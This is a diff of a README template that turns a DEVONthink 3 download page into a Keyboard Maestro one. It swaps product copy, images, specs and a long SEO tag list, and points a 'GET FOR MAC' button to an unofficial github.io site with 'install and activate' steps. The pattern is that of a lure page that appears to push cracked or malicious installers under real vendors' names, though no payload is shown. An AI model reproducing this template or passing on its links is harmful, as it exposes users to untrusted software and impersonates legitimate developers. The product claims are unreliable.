@@ -1,12 +1,12 @@
-# DEVONthink 3 – Smart Document Management & Knowledge Organization
+# Keyboard Maestro – Intelligent Mac Automation & Productivity Engine for macOS  
 
 <div align="center">  
-  <img src="https://www.macsparky.com/wp-content/uploads/2023/05/Icon-DEVONthink.png" width="250"/>  
+  <img src="https://images.icon-icons.com/3053/PNG/512/keyboard_maestro_macos_bigsur_icon_190042.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-aplications.github.io/.github/devonthink)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/maestro)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate DEVONthink 3 On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate Keyboard Maestro On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://tidbits.com/uploads/2019/04/DEVONthink-3-screenshot.jpg" width="1080"/>  
+  <img src="https://www.keyboardmaestro.com/img/v11/KeyboardMaestro11Poster.png" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**DEVONthink 3 for macOS** is a powerful document management and information organization platform developed by **DEVONtechnologies**. Designed for professionals, researchers, writers, and knowledge workers, it provides a secure, intelligent way to collect, organize, annotate, and retrieve digital information in one unified space.  
+**Keyboard Maestro for macOS** is a professional-grade automation tool designed to eliminate repetitive tasks and supercharge your daily workflow. Developed by **Stairways Software**, it allows you to create advanced macros that automate nearly every aspect of your Mac — from launching apps and typing text to executing complex logic-based workflows.  
 
-With advanced **AI-based classification**, DEVONthink automatically analyzes your content and suggests smart filing locations, making it effortless to maintain order even in massive databases. You can import documents, emails, PDFs, web archives, and notes — all searchable with lightning speed using advanced metadata filters, OCR, and Boolean operators.  
+What makes Keyboard Maestro unique is its **visual macro editor**, enabling you to design automations without coding — while still offering deep scripting power through **AppleScript**, **Shell**, and **JavaScript for Automation**. It’s flexible, powerful, and fully customizable, giving both beginners and power users the tools to build their own personalized productivity system.  
 
-DEVONthink seamlessly integrates with macOS and Safari, supports Markdown, and allows you to link or cross-reference documents just like a personal knowledge graph. Its **end-to-end encryption** keeps your databases private, while **synchronization** via iCloud, Dropbox, or local networks ensures secure access across multiple Macs and iOS devices with **DEVONthink To Go**.  
+You can trigger macros using **hotkeys**, **typed phrases**, **USB or MIDI inputs**, or even events like connecting to Wi-Fi or opening an app. Its **clipboard manager**, **window control**, and **text expansion** features make it indispensable for creators, developers, editors, and professionals who live in macOS.  
 
-For users who handle large volumes of data, DEVONthink 3 is not just a file manager — it’s a **thinking assistant**, a **digital archive**, and a **research powerhouse** that evolves with your workflow.  
+Optimized for the latest **Apple Silicon chips**, Keyboard Maestro runs faster than ever and integrates perfectly with external controllers such as the **Stream Deck**, creating a seamless, tactile automation experience.  
 
 ---  
 
@@ -40,15 +40,16 @@ For users who handle large volumes of data, DEVONthink 3 is not just a file mana
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| 🧠 **AI-Powered Organization**               | Automatically classifies and suggests where to file documents.              |
-| 📂 **Flexible Database System**              | Store and manage unlimited documents, PDFs, emails, and web archives.       |
-| 🔍 **Full-Text & OCR Search**                | Instantly search inside scanned PDFs and images with built-in OCR.          |
-| ✏️ **Annotation & Tagging Tools**            | Highlight, comment, and tag files for better organization.                  |
-| 🌐 **Web & Email Integration**               | Capture web pages, links, and mail directly into DEVONthink.                |
-| 🔗 **Cross-Linking & Wiki Features**         | Create connections between related files and notes.                         |
-| ☁️ **Secure Sync & Encryption**              | Sync safely across devices via iCloud, Dropbox, or local networks.          |
-| 📱 **Companion App – DEVONthink To Go**      | Access and edit your databases on iPhone and iPad.                          |
-| ⚡ **Optimized for Apple Silicon**            | Natively supports M1/M2 chips for high performance and stability.           |
+| ⚡ **Smart Automation Triggers**              | Launch macros using hotkeys, typed strings, system events, or time-based triggers. |
+| 🧩 **Visual Macro Builder**                   | Create powerful workflows with drag-and-drop logic, loops, and variables.    |
+| 💡 **Dynamic Logic & Conditions**             | Automate with intelligent if/then branches, calculations, and state checks.  |
+| 📝 **Snippets & Text Expansion**              | Instantly insert custom text, symbols, and formatted snippets.              |
+| 📋 **Clipboard History & Management**         | Keep multiple clipboards and quickly paste previous copies.                 |
+| 🖼️ **Image & Screen Recognition**             | Detect images or UI elements on the screen and automate interactions.       |
+| 🎛️ **Window & Application Control**           | Resize, move, and organize windows automatically for specific workflows.    |
+| 🔌 **Script & Integration Support**           | Combine macros with AppleScript, Shell, or JXA for limitless flexibility.   |
+| 🎚️ **Stream Deck Compatibility**             | Bind macros to Stream Deck keys for tactile control of your workflows.      |
+| 🚀 **Optimized for Apple Silicon**            | Full native support on M1/M2 Macs ensures peak responsiveness and stability.|
 
 ---  
 
@@ -56,14 +57,14 @@ For users who handle large volumes of data, DEVONthink 3 is not just a file mana
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 10.14 or later              |
+| OS            | macOS 10.13 or later              |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
-| Memory        | 4 GB RAM or higher                |
-| Storage       | 500 MB free disk space            |
+| Memory        | 2 GB RAM or higher                |
+| Storage       | 200 MB free disk space            |
 | Display       | 1280×800 resolution or higher     |
 
 ---  
 
 ## 🏷️ Tags  
 
-devonthink to go • devonthink download • devonthink pro 3 • devonthink pricing • devon think pro • devonthink 3 download • devonthink 3 pro • devonthink 3 review • devonthink and obsidian • devonthink m1 • devonthink pro download • devonthink safari • devonthink ventura • devonthink 3 mac • devonthink 3 macos • devonthink 3 for mac • devonthink 3 • devontechnologies • devonthink 4 • devonthink • devonthink pro • devonthink mac • devonthink3 • devon think 3  
+keyboard maestro for mac • keyboard maestro mac • keyboard maestro • maestro for mac • download keyboard maestro • key maestro • keyboard maestro m1 • keyboard maestro mac download • keyboard maestro editor mac • keyboard maestro editor • keyboard maestro app • keyboard maestro 10 • keyboard maestro for macbook • keyboard maestro for macos • stream deck keyboard maestro • keyboard maestro stream deck • keyboard maestro pro tools • keyboard maestro ios  
